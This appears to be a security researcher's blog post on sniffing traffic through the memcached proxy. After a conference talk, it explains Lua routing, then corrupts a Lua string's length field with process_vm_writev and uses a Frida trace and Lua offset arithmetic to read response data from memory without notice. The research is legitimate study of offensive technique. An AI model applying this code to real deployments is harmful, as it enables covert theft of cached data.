+++
title = "leveraging Lua to sniff memcached proxies"
date = 2024-08-29T22:54:02-07:00
+++

In early January 2024 I gave a talk at SchmooCon on memcached and some bugs I discovered through fuzzing ([slides here](https://github.com/hatRiot/shmoo24-memcached)). Unfortunately, due to the 20 minute slot, I did not have an opportunity to discuss payloads and further post-exploitation activities available to attackers. This post sums up some of those capabilities and includes a few other nuggets for VR/red teaming memcached. 

Mostly, this covers some of the tangential exploit development work I performed on memcached, as well as how we can sniff traffic flowing from the proxy to the data nodes. All relevant code (and slides) can be found on [Github](https://github.com/hatRiot/shmoo24-memcached). 

tl;dr
* memcached uses Lua to handle all proxy routing logic
* I don't want to inject stuff into the process
* we can modify these routing files and hot reload them into memcached 
* Lua can't read arbitrary memory, but we can modify certain objects to obtain a partial read/write
* through this read/write primitive, we can sniff request/response data

### brief recap

If you didn't see the talk and don't want to read the slides, here's another tl;dr: memcached is a RAM only key-value store used for unstructured data caching with broad enterprise adoption. It speaks three different protocols over three different channels (TCP, UDP, domain) and just barely supports any sort of authn (optional SASL); therefore, if you can hit the memcached port, you can likely access the node. The target of our research was more narrowly focused on the proxy, which is a native, built-in proxy speaking the memcached protocol designed to manage clusters of data nodes. This is a pretty new feature (1.6.13+) and, while it hasn't been as widely deployed as memcached itself, is clearly the performant choice for managing data clusters.

I fuzzed the proxy node itself and found a few pre-auth memory corruption bugs. The lack of authentication and general flexibility and verbosity of memcached nodes generally means delivery of an exploit implies access to the debug and management functions. These are extremely useful in grooming and inspecting the internal state and, consequently, eases the overall development of a reliable bug.

With code execution on a proxy node, in addition to gaining access to the server, we've also gained access to all data flowing through the proxy node; TLS support is experimental and nothing is encrypted at rest. This is probably fine. 

### routing

I think a quick primer on how routing works is probably useful here. As mentioned, it speaks the memcached protocol, so it's not just a dumb pipe shoveling bits from one end to the other. This fact allows for it to be extremely flexible; it can be configured to route to specific nodes based on certain inputs, commands, or behaviors. Requests can be modified, blocked, or otherwise manipulated entirely before forwarding (or responding). 

Routes and route handling are written in Lua and supported via an embedded Lua interpreter compiled into memcached. Example proxy libraries can be found [here](https://github.com/memcached/memcached-proxylibs), and the [simple](https://github.com/memcached/memcached-proxylibs/tree/main/lib/simple) route library is probably the most trivial example for understanding how it functions.

A route configuration looks something like this (`example.lua`):
```
package.loaded["simple"]=nil
local s = require("simple")

pool{
    name = "foo",
    backends = {"127.0.0.1:5444"},
}

pool{
    name = "bar",
    backends = {"127.0.0.1:5443"},
}
```
Which we can run and load using the following: `memcached -o proxy_config=example.lua -p11112`. This configuration defines two different routes: foo and bar. All requests destined for `foo` (ie `mg /foo/blah v`) are routed to the `foo` backends and all those destined for `bar` are routed to `bar` (ie `mg /bar/blah v`). Definitionally, a pool is a container for backends, and a route is the string path (ie. `/bar/blah`).

This is *about* all the simple routing library provides. It's a very simple (hence...simple) library that provides the essential "hello world" of routing via memcached. If we step up to `routelib`, a [more complex router](https://github.com/memcached/memcached-proxylibs/tree/main/lib/routelib), we unlock additional capabilities, including command-level routing, asynchronous pool support, and more. 

Let's quickly step down one level further to discover how these route libs actually work and interact with memcached. For a variety of performance reasons, as much as possible is performed within the critical path in C, and Lua used exclusively for configuration and processing hooks. The [proxy wiki](https://github.com/memcached/memcached/wiki/Proxy) has a great diagram describing how these pools/routes are bootstrapped:

{{< figure src="/images/posts/2024/memcachedflow.jpg" >}}

And:
```
The proxy flow starts by parsing a request (ie: get foo) and looking for a function hook for this command. 
If a hook exists, it will call the supplied function. If no hook exists, it will handle the request as 
though it were a normal memcached.

In Lua, this looks like: mcp.attach(mcp.CMD_GET, function) - Functions are objects and can be passed as 
arguments. The function is called within a coroutine [..]
```
All of the native Lua code is defined in [`proxy_lua.c`](https://github.com/memcached/memcached/blob/master/proxy_lua.c), which also defines the exported functions available to all route libraries (see [here](https://github.com/memcached/memcached/blob/master/proxy_lua.c#L1704)). To demonstrate, lets say whenever a GET request was received we wanted to print out the command. First, we'd need to create a generator and attach it to the command:

```
function mcp_config_routes(pool)
  -- get a new bare object.
  local fgen = mcp.funcgen_new()

  local handles = {}
  for _,v in pairs(pool.children) do
    table.insert(handles, fgen:new_handle(v))
  end

  -- finalize the function generator object. When we need to create a new
  -- slot, we will call `route_handler`, which will return a function
  fgen:ready({ f = route_handler, a = handles })

  -- attach this function generator to `get` commands
  mcp.attach(mcp.CMD_GET, fgen)
end
```
A `route_handler` then needs to be defined, which will create a function generator that can be executed each time we receive this command:
```
function route_handler(rctx, arg)
  local handles = arg
  return function(r)

    -- queue the request into each backend 
    rctx:enqueue(r, handles)
    rctx:wait_cond(#handles, mcp.WAIT_ANY)
    print("Command: ", r:command())

    -- this is essentially a route_allsync; wait for all responses to complete then return the first error seen.
    -- If no errors, return the last result
    for x=1, #handles do
      local res, mode = rctx:result(handles[x])
      if mode == mcp.RES_ANY then
        final = res
        break
      else
        final = res
      end
    end

    return final
  end
end
```
The generated route handler will ultimately return a response object: `mcp_resp_t` in C and `userdata` in Lua (this is a generic bucket for arbitrary C data). The handler is free to manipulate the response before returning back into memcached. Don't worry if this looks confusingly opaque; the specifics don't matter so much as the gist. Each time we get a request, memcached will invoke our command hook and execute the defined behavior. 

All this is to say, routing is *complicated* but extremely flexible. Each deployment of a proxy node or routing cluster may look entirely different from another based on the routing library used. 

### sniffing

There are two perspectives we can take to sniffing on the node: that of code executing within the process from, say, a delivered exploit, and that of an attacker on the system with memcached running. The latter is our target consideration for this post, though the former naturally flows from it as consequence. 

The obvious and dumbest way to initially do this is to just `tcpdump` the proxy port. Like I said, nothing is encrypted in transit by default, and TLS support is *experimental*, so at this point in time, you're unlikely to actually run into any TLS nodes.

A second strategy is to inject ourselves into the proxy process and hook from within. This has crossover with the first scenario (a delivered payload) since that simply obviates the need to inject. I found the easiest way to do this is to implement a shared library that hooks `read` and `write`, both used when handling TCP connections, then sniffing out the data. We can PoC this using Frida:

```
$ frida-trace -p4686 --decorate -i "read*" -i "write*"
```
In the above, we're dumping all calls to read/write functions, which memcached's proxy uses to read from the socket. This produces an output as such:

```
  9931 ms  write(fd=0x1, buf=0x7a6b74013010, count=0x11) [libc.so.6]
  9931 ms  write(fd=0x1, buf=0x7a6b74013010, count=0x26) [libc.so.6]
  9931 ms  write(fd=0x1, buf=0x7a6b74013010, count=0xa) [libc.so.6]
 12686 ms  read(fd=0x33, buf=0x7a6b700248f0, count=0x4000) [libc.so.6]
 12686 ms                 0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
7a6b700248f0  00 00 00 00 00 00 00 00 62 6c 61 68 20 76 0d 0a  ........blah v..
[..snip..]
```

There are of course considerations with this strategy: how to inject, how to unload/clean up, and other questions of stabilization. I was ultimately unhappy with this solution as I found it to be inflexible and generally messy.

Yet a third strategy is to inject ourselves into the routing layer of the proxy node. This is interesting as it doesn't require any special permissions, other than reading/writing the routing files, and we do not need to inject into the running proxy process, therefore we don't need ptrace or elevated privileges. Bringing in our previous understanding of the routing layer, it's easy to assume that we simply modify the routing file to write the request/response data to a file/pipe/whatever and be on our way. Unfortunately, it's not so easy.

After reviewing the routing library and available functionality, I discovered response data was not accessible via the Lua API. I briefly spoke with maintainers about this, and they stated this was intentional and by design for various performance reasons, but that may change in the future. Let's see what's available to begin with using the provided [routelib](https://github.com/memcached/memcached-proxylibs/blob/main/lib/routelib/routelib.lua) as example.

Requests are handled by a function generator which, in routelib, is denoted by the `_f` postfix. Some examples would be `route_allsync_f` and `route_zfailover_f` and contain the request/response processing logic for `allsync` and `zfailover` routes. Each handler has a set of library calls available to it and are defined [here](https://github.com/memcached/memcached/blob/90f1d91bd0b3048fc2e3dffad8511559568b8ac2/proxy_lua.c#L1704) (known as `mcp`). 

With access to the routing library, configuration, and proxy process, but no ability to dump the response from Lua, what can we do? My first thought was to enable access to the response from within the memcached library; unfortunately, this would require us to recompile memcached and reload, far messier than even injecting a shared library. My next thought was reading the response data out of the process itself, but Lua does not have access to arbitrary memory. While LuaJit and some libraries exist to do this, they require reloading the process (in addition to adding artifacts).

Around the time I was working on this, I found myself reading a [post](https://www.nccgroup.com/us/research-blog/pumping-iron-on-the-musl-heap-real-world-cve-2022-24834-exploitation-on-an-alpine-mallocng-heap/) from NCC on exploiting Redis and their exploit just so happened to leverage Lua objects. They overwrote the length of a `TString` to gain a partial read/write primitive (indexing into the string is unsigned), then elevated to arbitrary through the abuse of a fake `Table` object. This struck me as particularly convenient in memcached's case, as it could be leveraged by both an attacker delivering an exploit as well as one on system. Unfortunately, in the latter case, it would require elevated privileges on certain systems (reading `/proc/pid/`). In the end, I put together a proof of concept that enabled this same primitive in memcached's routing layer and used it to sniff the requests/responses as they flowed through the proxy. It's stable, accurate, and low maintanence. It can be trivially hidden, rolled back, modified, and injected without interrupting the proxy. 

### sniffing with Lua

In order to enable the address read/write, we need to setup a `TString` object to corrupt. Lua has two forms of the `TString`: short and long. They use the same struct typedef, but their fields are interpreted differently based on the type. Short strings have a [maximum length](https://github.com/lua/lua/blob/master/lstring.h#L29) of 40, so naturally anything larger constitutes a long string. Since we aim to maximize the length of the field, we'll need to use long strings.

Since memcached's proxy relies on Lua function generators to produce its route handlers, their execution does not share the same object space as *other* route handlers. This means we will need to leverage multiple long strings to access each route's request/response object. This turns out to be pretty simple. I modified the `route_allsync_f` handler with the following:

```
print(string.format("big string: %p", BIGSTRING))
```

And added the following global at the top:
```
BIGSTRING = "CAFEBABE" .. string.rep("A", 33)
```

When I start up the proxy, this produces:
```
big string: 0x71918001fc50
big string: 0x71918001fc50
big string: 0x71917801fc50
big string: 0x71917801fc50
big string: 0x71917401fc50
big string: 0x71917401fc50
big string: 0x71916c01fd60
big string: 0x71916c01fd60
```

Great, now we know where our strings are located. The next step is corrupting them. This is pretty easy, but depending on your system configuration, may require elevated privileges to access the process. My strategy here was:
1. Read `/proc/<pid>/maps` to locate all RW non-image backed regions
2. Search each of those regions for a magic string (CAFEBABEAA)
3. Overwrite each `TString` length field

This strategy ensured each instance of the `TString` for every route handler would be able to read the response data. I'll leave the details of the first two steps to readers of the code, but we'll touch briefly on how we corrupt a `TString`.

The struct definition is simple:
```
typedef struct TString {
  CommonHeader;
  lu_byte extra;  // reserved words for short strings; "has hash" for longs 
  ls_byte shrlen;  /* length for short strings, negative for long strings 
  unsigned int hash;
  union {
    size_t lnglen;  /* length for long strings 
    struct TString *hnext;  /* linked list for hash table 
  } u;
  char *contents;  /* pointer to content in long strings 
  lua_Alloc falloc;  /* deallocation function for external strings 
  void *ud;  /* user data for external strings 
} TString;
```
Since we can allocate a long string, we just need to adjust the `lnglen` field in order to gain our partial read/write. Here's the code I used to accomplish this:
```
int modify_tstring(pid_t pid, size_t address)
{
  size_t nwrite = 0;
  char MAXLEN[16] = {0xff,0xff,0xff,0x7f,0x0,0x0,0x0,0x0};
  struct iovec local[1];
  struct iovec remote[1];

  // update length
  local[0].iov_base = MAXLEN;
  local[0].iov_len = 16;
  remote[0].iov_base = address + (sizeof(int) * 4);
  remote[0].iov_len = 16;

  nwrite = process_vm_writev(pid, local, 1, remote, 1, 0);
  if(nwrite <= 0) {
    printf("[-] Failed to update lnglen: %s\n", strerror(errno));
    return -1;
  }

  return 0;
}
```

And after modifying one, we can confirm:
```
gef➤  p/x *(TString*)0x7898c001fc50
$2 = {
  next = 0x7898c001fb80,
  tt = 0x14,
  marked = 0x8,
  extra = 0x0,
  shrlen = 0x0,
  hash = 0x37b5b67f,
  u = {
    lnglen = 0x7fffffff,
    hnext = 0x7fffffff
  },
  contents = {0x0}
}
```
We can then use this and the string's `sub` function to read out arbitrary bytes of data from memory. In our case the target is the `mcp_resp_t` object. To do this, we need to figure out where our response object is located in memory. This turns out to be pretty simple in `allsync_f`, as the entire point of the function is to *build* the response and return it to C-land for further processing. In this case, it's the `final` object, and we can fetch its address using the following Lua code:
```
function getaddr(value)
  return tonumber(string.format("%p",value))
end

getaddr(final)
```
With this, we calculate the offset between our big string and the response and we're on our way. The response object is a [memcached type](https://github.com/memcached/memcached/blob/b1aefcdf8a265f8a5126e8aa107a50988fa1ec35/proxy.h#L493) `mcp_resp_t` and our response buffer is a pointer. So we'll need to read this address then read the response. This results in the following flow:
```
-- calculate distance between our str and reply
distance = (getaddr(final)-getaddr(BIGSTRING))-24

-- read address of reply str
outp = to_bo_hex(BIGSTRING:sub(distance+9, distance+16))
outp = tonumber(outp,16)

-- read string and dump
str = (outp-getaddr(BIGSTRING))-23

print("[+] received allsync request, response:")
hexdump(BIGSTRING:sub(str, str+final:vlen()))
```
You'll notice we offset the distance; this is because `BIGSTRING` doesn't point to the start of the `TString` struct, but rather to the value it contains. When indexing, we need to take this into account. Once we edit the route we can force memcached to reload the configuration and routelib by issuing the proxy process a `SIGHUP`.

Putting this together, if I send the following commands to the proxy:
```
> mg /foo/blah v
VA 2
hi

> mg /foo/test v
VA 4
test
```
I see the following on the proxy server:
```
[+] received allsync request, response:
68 69 0d
[+] received allsync request, response:
74 65 73 74 0d
```
I opted to retain the hexdump for response data as we'll traditionally get packed data back. This proves to be very accurate and stable, and flexible across any routes, or even routelibs, used on target systems. Additionally, though I only demonstrated access via to the meta-get command response, it trivially supports others.

### the end 

This whole thing might some day be for nought, as the memcached maintainers have expressed interest in adding the response data to Lua land. In that case, our method becomes trivial: modify the routelib to dump the response, SIGHUP the proxy process, and harvest data. I think that the primitives available here are still useful outside the context of memcached's current state, such as the weaponization of memory corruption bugs in the proxy (such as [CVE-2023-46852](https://nvd.nist.gov/vuln/detail/CVE-2023-46852)) or abuse through debug commands.

As always, the code is available on Github [here](https://github.com/hatRiot/shmoo24-memcached).